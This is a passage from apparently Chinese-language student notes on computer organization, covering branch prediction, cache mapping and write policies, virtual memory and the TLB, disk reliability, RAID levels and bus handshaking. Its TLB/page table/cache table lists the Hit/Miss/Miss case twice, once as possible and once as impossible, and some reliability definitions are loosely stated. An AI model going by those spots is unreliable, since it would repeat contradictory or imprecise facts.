</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-co-wk4-__codelineno-2-2"></a><span class="nf">add</span><span class="w"> </span><span class="nv">x3</span><span class="w"> </span><span class="nv">x1</span><span class="w"> </span><span class="nv">x4</span>
</span></code></pre></div>
<p>当我们load指令后面跟着依赖它的指令的时候,我们必须要stall一个周期等待mem阶段结束,再把数据传递给下一条指令的EX阶段.</p>
<p>否则就会出现"时间穿梭",即MEM阶段还没结束就把数据传出去了,这是不允许的.</p>
<p>很好,现在我们只剩下最后一个控制冒险了</p>
<h3 id="note-co-wk4-control-hazard">Control Hazard<a class="headerlink" href="#note-co-wk4-control-hazard" title="Permanent link">&para;</a></h3>
<p>当我们遇到跳转指令的时候,我们在EX阶段判断它是否跳转,但是早在ID阶段,下一条指令的IF阶段就已经开始取指令了,这就会导致控制冒险.</p>
<p>解决的方法有以下几种</p>
<ul>
<li>stall直接等待知道判断结束再进行取指令,但是太慢了</li>
<li>静态预测<ul>
<li>总是预测跳转:将跳转后的指令取进来，如果最后是不跳转的，那么就flush掉</li>
<li>总是预测不跳转:将原本跟着的指令取进来，如果最后是跳转的，那么就flush掉</li>
</ul>
</li>
<li>动态预测(最常用)<ul>
<li>一位预测,根据前面的跳转情况来预测当前情况,但是对于嵌套循环必有两次错误</li>
<li>两位预测,根据前面两次的跳转情况来预测当前情况,只有连续预测错两次才改变预测结果,容错率更高 </li>
</ul>
</li>
<li>
<p>将BJ-type的指令提前到ID阶段,可以与静态预测结合使用,也可以直接跟一条nop指令,ID结束后把正确的指令拿进来,不需要flush,比较简单</p>
</li>
<li>
<p>将跳转过的地址做一张索引表,快速寻址</p>
</li>
</ul>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/pip9.png" width="500" />

<figcaption>2 bit prediction</figcaption>
</figure></section><section class="print-page" id="note-co-wk5" heading-number="2.2.2.6"><h1 id="note-co-wk5-large-and-fast-exploiting-memory-hierarchy">Large and Fast: Exploiting Memory Hierarchy<a class="headerlink" href="#note-co-wk5-large-and-fast-exploiting-memory-hierarchy" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3177 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 10 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<ul>
<li>硬盘: 慢, 大, 便宜;</li>
<li>SRAM: 静态随机存取存储器, 速度快, 价格贵, 容量小;</li>
<li>DRAM: 动态随机存取存储器, 速度慢, 价格便宜, 容量大;</li>
</ul>
<h2 id="note-co-wk5-cache">Cache的引入<a class="headerlink" href="#note-co-wk5-cache" title="Permanent link">&para;</a></h2>
<p>在访问指令和数据时,我们都需要对memory进行访问;直接访问memory时很费时的,为了节省时间,我们可以造一块小的"内存",将其放在内存和CPU之间,这个小内存的访问速度比较快,里面存放的是即将被访问的数据,这就是cache(缓存);</p>
<p>这样的实现依赖于程序对memory的访问具有 <strong>两个局部性(Locality)</strong></p>
<ul>
<li>时间局部性(Temporal Locality): 如果一个内存位置被访问,那么它很可能在不久的将来再次被访问;</li>
<li>空间局部性(Spatial Locality): 如果一个内存位置被访问,那么它附近的位置很可能在不久的将来被访问;</li>
</ul>
<figure>
<img alt="cache" src="../NOTE/CO/pc/cache1.png" width="400" />

<figcaption>内存层次架构</figcaption>
</figure>
<div class="admonition definition">
<p class="admonition-title">基本概念</p>
<ul>
<li>Block: 存储在缓存中的数据单位。一般是Byte的倍数;</li>
<li>Hit: 当所需数据在缓存中找到时的情况。</li>
<li>Miss: 当所需数据不在缓存中，需要从更低层次的存储器中获取时的情况。</li>
<li>Miss Rate: 缓存未命中次数占总访问次数的比例。</li>
<li>Miss Penalty: 由于缓存未命中而需要从更低层次存储器中获取数据所花费的额外时间。</li>
</ul>
</div>
<h2 id="note-co-wk5-cache_1">Cache的基本组成<a class="headerlink" href="#note-co-wk5-cache_1" title="Permanent link">&para;</a></h2>
<h3 id="note-co-wk5-cache_2">直接映射Cache<a class="headerlink" href="#note-co-wk5-cache_2" title="Permanent link">&para;</a></h3>
<p>所谓直接映射的Cache(Direct-Mapped Cache),就是将内存中的一个Block直接映射到Cache中的一个Block;</p>
<p>是单射, 即一个内存地址只能映射到Cache中的一个地址;</p>
<p>假设我们现在有一个Cache,其能存放八个块(8 entry),现在有32个Block,那么我们就可以将这32个Block依次标上0-31的编号,得到块地址(Block index),然后依次将这些index模8,得到0-7的编号,然后将这些编号作为Cache的index,这样就可以将32个Block映射到Cache的8个块中;</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/cache2.png" width="400" />

<figcaption>直接映射Cache</figcaption>
</figure>
<p>从上面也可以看出,可能会有多种内存地址映射到同一个Cache的index,为了区分,我们还需要额外的一些位来区分不同的block,这就是标签(Tag).</p>
<p>最后,我们还需要一位Valid bit来区分当前的Block是否是内存中取出来的有效数据，还是一些无用的杂乱数据</p>
<p>所以，我们就得到了Cache的组成:</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/cache3.png" width="400" />

<figcaption>Cache的组成</figcaption>
</figure>
<div class="admonition cache">
<p class="admonition-title">Cache</p>
<p>Cache 里面每一行只用存放一个Block，一个Tag和一个Valid bit，index是不需要要存放的.</p>
</div>
<p>举个例子,假如我们现在有一个32位字节地址,一个块是4个字节,Cache有8个块,那么我们就可以将32位字节地址分为三部分:</p>
<ul>
<li>Byte offset: 2位</li>
<li>Block index: 3位</li>
<li>Tag: 27位</li>
</ul>
<p>如果有的时候给出十进制地址,我们也可以将其转换为二进制地址,然后进行上述的划分;</p>
<p>当然，更快捷的方法是：</p>
<p>原地址 / 块大小 = 块地址，然后取余数，得到Byte offset;</p>
<p>块地址 / Cache的组数(对于直接映射Cache,组数为块数) = Tag，然后取余数，得到Block index;</p>
<div class="admonition example">
<p class="admonition-title">计算Cache的大小</p>
<p><div align="center">
<img src="../NOTE/CO/pc/cache4.png" width="400">
</div></p>
</div>
<h3 id="note-co-wk5-cache_3">组相联Cache<a class="headerlink" href="#note-co-wk5-cache_3" title="Permanent link">&para;</a></h3>
<p>组相连Cache(Set Associative Cache)，就是将Cache中的块分为若干组，每组中的块数可以是多块;</p>
<p>例如二路组相联Cache,一组,允许两个块映射到同一个Cache的同一组;</p>
<p>但是要在同一组中并行比较两个Tag,所以需要多一个比较器(直接映射Cache只需要一个比较器);</p>
<p>如果是多路组相联Cache,那么就需要多路比较器;</p>
<p>如果整个块都是一组,那么就是全相连Cache(Fully Associative Cache);一个Cache有多少块就需要多少个比较器;</p>
<p>同时也不难发现,每多一组,Index的位数就会减少一位,Tag的位数就会增加一位;</p>
<p>对于n路组相联,首先得到块index,然后将块index mod n,得到组index,然后进入到组中将Tag和该组中的所有Tag进行比较,如果匹配成功,那么就命中,否则就未命中;</p>
<p>例如:</p>
<ul>
<li>直接映射Cache: 8个块,8组,3位Index, 27位Tag;</li>
<li>二路组相联Cache: 8个块,4组,2位Index, 28位Tag;
...</li>
</ul>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/cache5.png" width="600" />

<figcaption>不同的Cache</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">Block大小对于Cache的影响</p>
<p>Block越大,Cache的命中率越高,但是Cache的Miss Penalty也越大;同时,Cache的容量也会变大.占用更多的空间.</p>
</div>
<h2 id="note-co-wk5-hitmiss">Hit和Miss的处理<a class="headerlink" href="#note-co-wk5-hitmiss" title="Permanent link">&para;</a></h2>
<h3 id="note-co-wk5-read">Read<a class="headerlink" href="#note-co-wk5-read" title="Permanent link">&para;</a></h3>
<p>如果要读某一个地址的数据,如果</p>
<ul>
<li>Read Hit Cache命中,那么就直接从Cache中读取数据;</li>
<li>Read Miss Cache未命中,那么就从更低层次的存储器中读取数据,然后将其放入Cache中;<ul>
<li>data cache miss：先把对应的 block 从内存中取到 cache 里，然后再读</li>
<li>instruction cache miss：暂停 CPU 的运行，即保持 PC 不变，从 memory 里把对应的 block 拿到 cache，然后重新运行当前这条指令   </li>
</ul>
</li>
</ul>
<h3 id="note-co-wk5-write">Write<a class="headerlink" href="#note-co-wk5-write" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Write Hit:</p>
<ul>
<li>Write Back: 只更新Cache中的数据,不更新更低层次的存储器,当更新过的数据从Cache中被替换出去时,才更新更低层次的存储器;此时需要一个Dirty bit来标记该数据是否被更新过;</li>
<li>Write Through: 同时更新Cache和更低层次的存储器;</li>
</ul>
</li>
<li>
<p>Write Miss:</p>
<ul>
<li>Write Allocate: 将数据从更低层次的存储器中读取到Cache中,然后更新Cache中的数据;</li>
<li>Write No Allocate: 不将数据从更低层次的存储器中读取到Cache中,直接更新更低层次的存储器;</li>
</ul>
</li>
</ul>
<p>Write Back通常和Write Allocate一起使用(即先写入缓存,再写入更低层次的存储器),而Write Through通常和Write No Allocate一起使用(即直接写入更低层次的存储器);</p>
<h3 id="note-co-wk5-_1">替换策略<a class="headerlink" href="#note-co-wk5-_1" title="Permanent link">&para;</a></h3>
<p>当Cache某一组已经满了,但是又要有新的块要进来,这时候就需要替换掉Cache中的一个块;</p>
<ul>
<li>随机替换(Random Replacement): 随机选择一个块进行替换;</li>
<li>最近最少使用(Least Recently Used, LRU): 选择最近最少使用的块进行替换;</li>
<li>先进先出(First In First Out, FIFO): 选择最早进入Cache的块进行替换;</li>
</ul>
<h3 id="note-co-wk5-cache_4">多级Cache<a class="headerlink" href="#note-co-wk5-cache_4" title="Permanent link">&para;</a></h3>
<p>多级Cache的主要目的是为了在不同层次的存储器之间取得平衡。每一级Cache都有不同的大小和速度，越靠近CPU的Cache越小但速度越快，越远离CPU的Cache越大但速度越慢。</p>
<ul>
<li>
<p>一级Cache（L1）非常小且非常快，通常与CPU核心集成在一起，用于存储最频繁使用的数据。二级Cache（L2）稍大一些，速度稍慢一些，但仍然比主存储器快。三级Cache（L3）更大更慢，但仍然比主存储器快。通过这种方式，系统可以在速度和容量之间取得平衡。</p>
</li>
<li>
<p>多级Cache可以显著减少内存访问的延迟。CPU首先尝试从L1 Cache读取数据，如果未命中则尝试从L2 Cache读取，依此类推，直到最终从主存储器读取数据。每一级Cache的命中率都很高，从而减少了访问主存储器的次数。</p>
</li>
<li>
<p>由于多级Cache可以减少内存访问的延迟，因此可以显著提高系统的整体性能。CPU可以更快地访问所需的数据，从而减少等待时间，提高指令执行效率。</p>
</li>
<li>
<p>多级Cache还可以帮助优化能效。访问较低层次的Cache比访问主存储器消耗更少的能量，因此多级Cache可以帮助减少系统的整体能耗。</p>
</li>
</ul>
<p>总的来说,越靠近CPU的Cache,速度越快,容量越小,更加关注访问速度;越远离CPU的Cache,速度越慢,容量越大,更加关注Miss Rate;</p>
<div class="admonition example">
<p class="admonition-title">多级Cache</p>
<p>假设初始CPI为1,L1 Cache的Miss Rate为1%,L2 Cache的Miss Rate为5%;</p>
<p>访问L2 Cache的时钟周期为10,访问主存的时钟周期为100;</p>
<ul>
<li>如果没有L2 Cache,那么CPI为1+1%*100=11;</li>
<li>如果使用L2 Cache,那么CPI为1+1%*10+1%*5%*100=1.15;</li>
</ul>
<p>大大减少了CPI,提高了性能;</p>
<p>这里还需要注意的一个点是,并不是说越往下的Cache Miss Rate一定越低,例如L1 Cache的Miss Rate为1%,L2 Cache的Miss Rate为5%,但是增加了L2 Cache后,Miss时必须要两个Cache都未命中,即增加多级Cache,可以降低整体的Miss Rate,单个Cache的Miss Rate未必低。</p>
</div>
<h2 id="note-co-wk5-virtual-memory">虚拟内存(Virtual Memory)<a class="headerlink" href="#note-co-wk5-virtual-memory" title="Permanent link">&para;</a></h2>
<p>虚拟内存（Virtual Memory）是一种内存管理技术，它为应用程序提供了一个假象，即每个进程都拥有连续且独立的内存空间。实际上，虚拟内存将物理内存和磁盘存储结合起来，使得系统能够运行比实际物理内存更大的程序。</p>
<p>虚拟内存技术使得各个进程之间并不知道其他进程的物理地址空间，只有操作系统（OS）知道所有进程的地址空间，这样就保证了进程之间不会相互干扰，也避免了某些进程对于内存空间的破坏。</p>
<p>有以下几个概念</p>
<ul>
<li>页(Page): 虚拟内存将内存划分为固定大小的块，称为页。</li>
<li>页表(Page Table): 页表是一个数据结构，用于映射虚拟地址到物理地址。每个进程都有一个独立的页表。</li>
</ul>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/page1.png" width="600" />

<figcaption>虚拟内存示意图</figcaption>
</figure>
<p>例如上图中左边是一个进程的虚拟地址空间,右边是物理地址空间和磁盘;虚拟地址空间是连续的，映射到了不连续的物理地址空间和磁盘空间;</p>
<p>虚拟地址映射只对地址的高位进行，即只进行虚拟页与物理页的映射;页内偏移是固定的；</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/page2.png" width="600" />

<figcaption>虚拟地址映射</figcaption>
</figure>
<p>一般而言，虚拟地址的位数比物理地址的位数更多;</p>
<p>每一次出现 page fault 我们都需要访问一次 disk，这是非常耗时的（访问时间可以达到访问 memory 的十万倍），因此我们需要尽可能减少 page fault，例如增大 page 的大小可以减少 page fault 的次数;访问硬盘太慢了，因此我们要采用 write back 策略。</p>
<h3 id="note-co-wk5-page-table-tlb">Page Table 和 TLB<a class="headerlink" href="#note-co-wk5-page-table-tlb" title="Permanent link">&para;</a></h3>
<p>使用一个表格来记录虚拟地址到物理地址的映射关系;其index就是Virtual address,即虚拟页号;页表里面存放的是物理页号+1 bit的valid bit;</p>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/page3.png" width="600" />

<figcaption>Page Table</figcaption>
</figure>
<p>每一个进程都有自己各自的 page table，program counter 和 page table register（用来存储它对应的 page table 的位置），当我们在进程中切换时，只需要切换页表就可以了。</p>
<p>为了减少miss rate,页表使用的是全相连;但是注意页表不是Cache；</p>
<p>为了进一步提高Page Table的访问速度,我们可以使用TLB(Translation Lookaside Buffer)来加速;</p>
<p>TLB是页表的Cache,使用虚拟页号作为地址,有直接映射，组相联，全相联三种;</p>
<p>首选拿到虚拟地址,然后进行TLB的访问,如果TLB命中,那么就返回物理地址;如果TLB未命中,那么就去页表里面找;</p>
<ul>
<li>如果发现对应项的 valid bit 是 1，那么就把它拿到 TLB 里此时被替换掉的 TLB entry 的 dirty bit 如果是 1，也要写回 page table）</li>
<li>如果对应项的 valid bit 是 0，就说明这一个 page 不在内存中，会触发一个 page fault。OS 会先把这个 page 从 disk 中取到内存中，并更新 page talbe，最后再重新执行一次 TLB 的查找</li>
</ul>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/page4.png" width="600" />

<figcaption>流程图</figcaption>
</figure>
<figure>
<img alt="alt text" src="../NOTE/CO/pc/page5.png" width="600" />

<figcaption>从虚拟内存到数据访问</figcaption>
</figure>
<p>TLB, Page Table, Cache 三者之间Hit的情况如下表所示：</p>
<table>
<thead>
<tr>
<th>TLB</th>
<th>Page table</th>
<th>Cache</th>
<th>Possible? If so, under what circumstance?</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hit</td>
<td>Hit</td>
<td>Hit</td>
<td>Possible, although the page table is never really checked if TLB hits.</td>
</tr>
<tr>
<td>Hit</td>
<td>Miss</td>
<td>Miss</td>
<td>Possible, although the page table is never really checked if TLB hits.</td>
</tr>
<tr>
<td>Miss</td>
<td>Hit</td>
<td>Hit</td>
<td>TLB misses, but entry found in page table; after retry, data is found in cache.</td>
</tr>
<tr>
<td>Miss</td>
<td>Hit</td>
<td>Miss</td>
<td>TLB misses, but entry found in page table; after retry, data misses in cache.</td>
</tr>
<tr>
<td>Miss</td>
<td>Miss</td>
<td>Miss</td>
<td>TLB misses and is followed by a page fault; after retry, data must miss in cache.</td>
</tr>
<tr>
<td>Hit</td>
<td>Miss</td>
<td>Miss</td>
<td>Impossible: cannot have a translation in TLB if page is not present in memory.</td>
</tr>
<tr>
<td>Hit</td>
<td>Miss</td>
<td>Hit</td>
<td>Impossible: cannot have a translation in TLB if page is not present in memory.</td>
</tr>
<tr>
<td>Miss</td>
<td>Miss</td>
<td>Hit</td>
<td>Impossible: data cannot be allowed in cache if the page is not in memory.</td>
</tr>
</tbody>
</table></section><section class="print-page" id="note-co-wk6" heading-number="2.2.2.7"><h1 id="note-co-wk6-storage-networks-and-other-io-topics">Storage, Networks and Other I/O Topics<a class="headerlink" href="#note-co-wk6-storage-networks-and-other-io-topics" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2820 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 7 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 10 分钟</p>
</div>
<h2 id="note-co-wk6-_1">引入<a class="headerlink" href="#note-co-wk6-_1" title="Permanent link">&para;</a></h2>
<p>I/O 操作是计算机系统中的一个重要组成部分，它是计算机与外部设备之间的数据传输。</p>
<p>I/O 设备的设计需要考虑许多方面，包括：</p>
<ul>
<li>可拓展性</li>
<li>可靠性</li>
<li>性能</li>
<li>适应性</li>
</ul>
<p>I/O 的性能主要由以下几个方面决定：</p>
<ul>
<li>设备和系统之间的连接</li>
<li>内存层次架构</li>
<li>操作系统</li>
</ul>
<div align="center">
    <img src="../NOTE/CO/pc/IO1.png" width="50%">
</div>

<p>每一个 I/O 设备都有一个对应的控制器，负责管理设备的操作。控制器通过总线（bus）与 CPU 进行通信，从而实现 I/O 设备与 CPU 的交互。</p>
<p>IO 的行为有输入（input）和输出（output）,或者存储（storage）。</p>
<ul>
<li>Input: 从设备到主存,read once;</li>
<li>Output: 从主存到设备,write only;</li>
<li>Storage: can be reread and usually rewritten</li>
</ul>
<p>如何评价一个 I/O 设备的性能主要取决于它的具体用途</p>
<p>Throughput</p>
<p>这里的吞吐量可以指单位时间传输的数据量，也可以指单位时间进行的 I/O 的操作的数量</p>
<p>Response time</p>
<p>响应时间，其实就是进行一次 I/O 操作所需的时间</p>
<p>both throughput and response time</p>
<p>同时考虑上面两个因素</p>
<h2 id="note-co-wk6-_2">硬盘的结构<a class="headerlink" href="#note-co-wk6-_2" title="Permanent link">&para;</a></h2>
<p>硬盘（Hard Disk Drive, HDD）是计算机中常见的存储设备之一。它由多个盘片（platter）组成，这些盘片通过主轴（spindle）固定在一起，并且可以高速旋转。每个盘片的两面都覆盖有磁性材料，用于存储数据。</p>
<p>硬盘的主要组成部分包括：</p>
<ol>
<li>盘片（Platter）：硬盘内部的圆形磁盘，用于存储数据。盘片的数量可以有多个，通常为2到5个。每一个盘上都有很多同心圆，这些同心圆称为磁道（track），每一个磁道被划分为多个扇区（sector）。扇区是硬盘存储数据的最小单位。</li>
<li>主轴（Spindle）：用于固定和旋转盘片的轴。主轴电机驱动盘片旋转，通常转速为5400 RPM（转每分钟）到7200 RPM，高性能硬盘可以达到10000 RPM甚至15000 RPM。</li>
<li>磁头（Read/Write Head）：用于读取和写入数据的部件。每个盘片的两面都有一个磁头，磁头通过悬臂（actuator arm）固定在一起，并由伺服电机（servo motor）控制其移动。</li>
<li>悬臂（Actuator Arm）：连接磁头并控制其在盘片表面上的移动。悬臂的移动由伺服电机驱动，可以在盘片的半径方向上移动，以便磁头能够访问盘片上的不同位置。</li>
<li>控制电路（Controller Circuit）：硬盘内部的电路板，用于控制硬盘的读写操作、数据传输和错误校正等功能。</li>
</ol>
<p>硬盘的工作原理如下：</p>
<ol>
<li>当计算机需要读取或写入数据时，硬盘控制器会将相应的指令发送给硬盘。</li>
<li>主轴电机驱动盘片高速旋转，磁头在悬臂的控制下移动到指定的轨道（track）位置。</li>
<li>磁头通过感应盘片表面的磁性变化来读取数据，或通过改变盘片表面的磁性来写入数据。</li>
<li>读取或写入的数据通过控制电路传输到计算机的主存或其他设备。</li>
</ol>
<p>硬盘的性能主要由以下几个方面决定：</p>
<ol>
<li>转速（RPM）：盘片的旋转速度，转速越高，数据访问速度越快。</li>
<li>磁头寻道时间（Seek Time）：磁头移动到目标轨道所需的时间，寻道时间越短，数据访问速度越快。</li>
<li>数据传输率（Data Transfer Rate）：硬盘与计算机之间的数据传输速度，传输率越高，数据访问速度越快。</li>
<li>缓存（Cache）：硬盘内部的高速缓存，用于临时存储数据，提高数据传输效率。</li>
</ol>
<p>硬盘的优点包括容量大、价格低廉、数据保存时间长等，但其缺点是速度较慢、易受震动影响、功耗较高等。</p>
<div align="center">
    <img src="../NOTE/CO/pc/HDD.png" width="50%">
</div>

<div class="admonition info">
<p class="admonition-title">硬盘可靠性指标</p>
<ul>
<li>MTTF: Mean Time To Failure, 平均无故障时间,即两次故障之间的平均时间</li>
<li>MTTR: Mean Time To Repair, 平均修复时间,即两次故障之间的平均修复时间</li>
<li>MTBF: Mean Time Between Failure, 平均故障间隔时间,即两次可用时间之间的平均时间(MTTF+MTTR)</li>
<li>Availability: 可用性,即硬盘在正常工作状态下的时间占总时间的比例(MTBF/(MTBF+MTTR))</li>
<li>AFR: Annualized Failure Rate, 年化故障率,即硬盘在一年内的故障率,AFR=YEAR/MTTF</li>
</ul>
<p>提升MTTF（平均无故障时间）的方法包括：</p>
<ul>
<li>Fault avoidance</li>
<li>Fault tolerance</li>
<li>Fault forecasting</li>
</ul>
<p>Reliability of N disks = Reliability of 1 disk / N</p>
<p>硬盘的可靠性随着硬盘数量的增加而降低，这是因为每个硬盘都有可能发生故障.</p>
</div>
<h2 id="note-co-wk6-raid">RAID<a class="headerlink" href="#note-co-wk6-raid" title="Permanent link">&para;</a></h2>
<p>RAID（Redundant Array of Inexpensive Disks，廉价磁盘冗余阵列）是一种将多个独立的物理硬盘组合成一个逻辑单元，以提高数据存储性能、可靠性和容量的技术。RAID有多个级别，每个级别都有不同的特点和应用场景。</p>
<h3 id="note-co-wk6-raid-0">RAID 0<a class="headerlink" href="#note-co-wk6-raid-0" title="Permanent link">&para;</a></h3>
<p>RAID 0通过将数据条带化（striping）分布在多个磁盘上来提高性能。RAID 0没有冗余，因此数据的可靠性较低。如果其中一个磁盘发生故障，所有数据将会丢失。</p>
<ul>
<li>优点：读写性能显著提高，存储利用率为100%。</li>
<li>缺点：没有数据冗余，可靠性低。</li>
</ul>
<figure>
<img alt="" src="../NOTE/CO/pc/RAID1.png" width="400" />

<figcaption>RAID-1</figcaption>
</figure>
<h3 id="note-co-wk6-raid-1">RAID 1<a class="headerlink" href="#note-co-wk6-raid-1" title="Permanent link">&para;</a></h3>
<p>RAID 1通过将数据镜像（mirroring）到两个或多个磁盘上来提高数据可靠性。每个磁盘都有相同的数据副本，因此即使一个磁盘发生故障，数据仍然可以从其他磁盘中恢复。</p>
<ul>
<li>优点：高数据可靠性，读性能有所提高。</li>
<li>缺点：存储利用率为50%，写性能略有下降。</li>
</ul>
<h3 id="note-co-wk6-raid-2">RAID 2<a class="headerlink" href="#note-co-wk6-raid-2" title="Permanent link">&para;</a></h3>
<p>RAID 2使用位级条带化（bit-level striping）和海明码（Hamming code）进行错误校正。RAID 2在现代系统中很少使用，因为其复杂性和对同步磁盘的需求。</p>
<ul>
<li>优点：提供错误检测和校正。</li>
<li>缺点：实现复杂，存储利用率低。</li>
</ul>
<h3 id="note-co-wk6-raid-3">RAID 3<a class="headerlink" href="#note-co-wk6-raid-3" title="Permanent link">&para;</a></h3>
<p>RAID 3使用字节级条带化（byte-level striping）和一个专用的奇偶校验磁盘来提供数据冗余,当其中一个盘的数据出现问题时，可以通过其他盘的数据和校验位来恢复数据。RAID 3适用于大文件的顺序读写，但在处理多个并发请求时性能较差。</p>
<ul>
<li>优点：提供数据冗余，适合大文件顺序读写。</li>
<li>缺点：并发处理性能较差，奇偶校验磁盘成为瓶颈；我们无法确定哪一个盘出现问题。</li>
</ul>
<figure>
<img alt="" src="../NOTE/CO/pc/RAID3.png" width="400" />

<figcaption>RAID-3</figcaption>
</figure>
<h3 id="note-co-wk6-raid-4">RAID 4<a class="headerlink" href="#note-co-wk6-raid-4" title="Permanent link">&para;</a></h3>
<p>RAID 4使用块级条带化（block-level striping）和一个专用的奇偶校验磁盘。与RAID 3类似，但RAID 4在处理并发请求时性能更好。</p>
<ul>
<li>
<p>优点：允许同时对不同的盘进行独立的读操作，RAID 4 让每一个 sector 都有自己单独的校验位，这样就可以确定出错的硬盘。对于 small read 和 large write 表现良好</p>
</li>
<li>
<p>缺点：奇偶校验磁盘仍然是瓶颈，对于 small write 表现不佳</p>
</li>
</ul>
<h3 id="note-co-wk6-raid-5">RAID 5<a class="headerlink" href="#note-co-wk6-raid-5" title="Permanent link">&para;</a></h3>
<p>RAID 5使用块级条带化和分布式奇偶校验。奇偶校验信息分布在所有磁盘上，消除了单一奇偶校验磁盘的瓶颈。RAID 5在性能和数据冗余之间取得了良好的平衡。</p>
<ul>
<li>优点：提供数据冗余，读写性能较好，存储利用率高。</li>
<li>缺点：写操作需要计算和写入奇偶校验信息，性能略有下降。</li>
</ul>
<h3 id="note-co-wk6-raid-6">RAID 6<a class="headerlink" href="#note-co-wk6-raid-6" title="Permanent link">&para;</a></h3>
<p>RAID 6类似于RAID 5，但使用双重分布式奇偶校验，可以容忍两个磁盘同时发生故障。RAID 6提供了更高的数据可靠性，适用于对数据安全性要求较高的场景。</p>
<ul>
<li>优点：提供更高的数据冗余，能够容忍两个磁盘故障。</li>
<li>缺点：写操作开销更大，存储利用率略低于RAID 5。</li>
</ul>
<h2 id="note-co-wk6-_3">总线<a class="headerlink" href="#note-co-wk6-_3" title="Permanent link">&para;</a></h2>
<p>总线并不只有单独一根线，实际上时多条线组合在一起，把各种设备相互连接起来。</p>
<ul>
<li>控制线(Control Lines): 用于传输控制信号，如时钟信号、复位信号等。</li>
<li>数据线(Data lines): 用于上传输数据，例如地址和读写的数据。</li>
</ul>
<p>总线工作：包括两个部分：发送地址和接收或发送数据</p>
<ul>
<li>输入：从设备向内存输入数据</li>
<li>输出：从内存向设备输出数据</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Bus transaction</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:2"><input checked="checked" id="note-co-wk6-_3-input" name="note-co-wk6-__tabbed_1" type="radio" /><input id="note-co-wk6-_3-output" name="note-co-wk6-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-co-wk6-_3-input">Input</label><label for="note-co-wk6-_3-output">Output</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<p><div align="center">
    <img src="../NOTE/CO/pc/Bus1.png" width="90%">
</div></p>
</div>
<div class="tabbed-block">
<p><div align="center">
    <img src="../NOTE/CO/pc/Bus2.png" width="90%">
</div></p>
</div>
</div>
</div>
</div>
<h3 id="note-co-wk6-_4">同步和异步<a class="headerlink" href="#note-co-wk6-_4" title="Permanent link">&para;</a></h3>
<ul>
<li>同步(Synchronous):所有的设备都有相同的时钟频率，但由于数据传输有延迟，clock skew 无法避免，所以信号线的长度必须尽可能短</li>
<li>异步(Asynchronous): 设备不需要有相同的时钟频率，通过握手协议来进行数据传输</li>
</ul>
<figure>
<img alt="" src="../NOTE/CO/pc/Bus3.png" width="400" />

<figcaption>七次握手</figcaption>
</figure>
<ol>
<li>首先，I/O 设备发出 <code>ReadReq</code> 信号，请求从主存储器读取数据，并传输相应的内存地址。</li>
<li>主存储器接收到 <code>ReadReq</code> 信号并读取地址后，发出 <code>Ack</code> 信号，表示已收到 <code>ReadReq</code> 信号，并开始准备数据。</li>
